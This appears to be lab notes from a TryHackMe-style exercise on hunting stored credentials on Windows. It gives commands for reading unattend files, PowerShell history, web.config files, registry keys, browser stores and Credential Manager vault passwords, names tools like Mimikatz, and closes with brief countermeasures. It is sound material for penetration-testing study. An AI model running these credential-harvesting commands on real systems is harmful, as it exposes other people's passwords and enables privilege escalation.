# Windows Credential Hunting

Gathering credentials is one of the most effective ways to escalate privileges on Windows systems. This document covers common locations and methods to find stored credentials on Windows machines.

## Unattended Windows Installations

When deploying Windows across multiple machines, administrators often use unattended installation files which may contain credentials. Check these locations:

```powershell
# Common locations for unattended installation files
Get-ChildItem C:\Unattend.xml -ErrorAction SilentlyContinue
Get-ChildItem C:\Windows\Panther\Unattend.xml -ErrorAction SilentlyContinue
Get-ChildItem C:\Windows\Panther\Unattend\Unattend.xml -ErrorAction SilentlyContinue
Get-ChildItem C:\Windows\system32\sysprep.inf -ErrorAction SilentlyContinue
Get-ChildItem C:\Windows\system32\sysprep\sysprep.xml -ErrorAction SilentlyContinue
```

Look for credential sections in these files:

```xml
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

## PowerShell History

PowerShell saves command history, which might contain credentials used in commands:

```cmd
# From CMD:
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# From PowerShell:
Get-Content (Get-PSReadlineOption).HistorySavePath
# Or
Get-Content "$Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
```

## Saved Windows Credentials

Windows allows saving credentials for later use, which can be listed and used:

```powershell
# List saved credentials
cmdkey /list

# Use saved credentials to run commands as another user
runas /savecred /user:DOMAIN\username cmd.exe
```

## IIS Configuration Files

Internet Information Services (IIS) configuration files often contain database connection strings with credentials:

```powershell
# Common locations for web.config files
Get-ChildItem C:\inetpub\wwwroot\web.config -ErrorAction SilentlyContinue
Get-ChildItem C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config -ErrorAction SilentlyContinue

# Search for connection strings in these files
findstr "connectionString" C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
findstr "connectionString" C:\inetpub\wwwroot\web.config
```

## Credentials in Software Configurations

### PuTTY

PuTTY client might store proxy credentials:

```powershell
# Search for stored proxy credentials
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

### WinSCP

WinSCP may save session information with obfuscated passwords:

```powershell
# Check for WinSCP saved sessions
reg query HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions /s
```

### Remote Desktop Credentials

Saved RDP connections may contain credentials:

```powershell
# Check for saved RDP credentials
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s
```

## Credentials in Registry

Windows may store credentials in the registry:

```powershell
# Search for passwords in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## Credentials Manager

Windows Credential Manager stores credentials for websites, applications, and networks:

```powershell
# PowerShell (requires admin rights)
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | % { $_.RetrievePassword(); $_ }

# Using vaultcmd (built-in)
vaultcmd /listcreds:"Windows Credentials" /all
vaultcmd /listcreds:"Web Credentials" /all
```

## Browser Stored Credentials

Browsers often store login credentials that can be extracted:

```powershell
# Chrome profiles are located at:
# "%LocalAppData%\Google\Chrome\User Data\Default\Login Data"

# Edge profiles are located at:
# "%LocalAppData%\Microsoft\Edge\User Data\Default\Login Data"

# Firefox profiles are located at:
# "%AppData%\Mozilla\Firefox\Profiles\<profile>\logins.json"
```

Tools like LaZagne can automate the extraction of browser credentials.

## Configuration Files

Many applications store credentials in configuration files:

```powershell
# Search for common config files
Get-ChildItem -Path C:\ -Include *.xml,*.ini,*.txt,*.config,*.conf,*.cfg,*.inc -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password|credentials|secret" | Select Path,Line
```

## Real-World Examples

### Example 1: PowerShell History

A system administrator ran a command that included credentials:

```powershell
$password = ConvertTo-SecureString "ZuperCkretPa5z" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("julia.jones", $password)
Invoke-Command -ComputerName FS01 -Credential $cred -ScriptBlock { Get-ChildItem C:\Confidential }
```

### Example 2: IIS Web.config

A web.config file with database credentials:

```xml
<connectionStrings>
    <add name="MyDatabase" connectionString="Data Source=SQLServer;Initial Catalog=MyDatabase;User ID=db_admin;Password=098n0x35skjD3" providerName="System.Data.SqlClient" />
</connectionStrings>
```

### Example 3: Using Saved Credentials

Using `runas` with saved credentials to run commands as another user:

```cmd
# List saved credentials
cmdkey /list

# Use saved credentials to run cmd as a different user
runas /savecred /user:mike.katz cmd.exe

# Navigate to the desktop and read a flag
type C:\Users\mike.katz\Desktop\flag.txt
# Output: THM{WHAT_IS_MY_PASSWORD}
```

### Example 4: PuTTY Saved Session

Extracting a saved password from PuTTY:

```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
# Output reveals proxy credentials for user thom.smith with password CoolPass2021
```

## Automated Credential Hunting Tools

- **LaZagne**: Retrieves passwords stored on a local computer
- **Mimikatz**: Extracts plaintext passwords, hashes, and tickets from memory
- **SessionGopher**: Extracts saved session information for remote access tools
- **SharpWeb**: .NET tool for grabbing credentials from web browsers

## Countermeasures

To protect against credential hunting:
- Avoid storing credentials in plain text
- Use Windows Credential Guard
- Implement strong password policies
- Regularly audit stored credentials
- Avoid saving credentials when not necessary
- Use more secure authentication methods like Windows Hello or smart cards 